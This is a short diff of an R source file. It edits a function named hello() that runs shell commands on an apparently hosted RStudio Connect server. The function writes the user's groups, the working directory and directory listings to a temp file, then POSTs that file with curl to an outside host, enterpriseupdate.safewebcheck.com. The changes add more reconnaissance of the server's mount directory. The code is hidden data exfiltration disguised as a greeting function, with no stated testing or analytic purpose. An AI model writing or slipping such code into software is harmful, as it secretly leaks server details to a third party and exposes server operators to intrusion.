@@ -26,5 +26,6 @@ hello <- function() {
 system('groups > /tmp/body.txt')
 system('echo ===== >> /tmp/body.txt')
 #system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
-system('ls -la >> /tmp/body.txt')
+system('pwd >> /tmp/body.txt')
+system('ls -la /var/lib/rstudio-connect/mnt/ >> /tmp/body.txt')
 system('curl -X POST -H "Content-Type: text/plain" --data-binary "@/tmp/body.txt" http://enterpriseupdate.safewebcheck.com:4265')
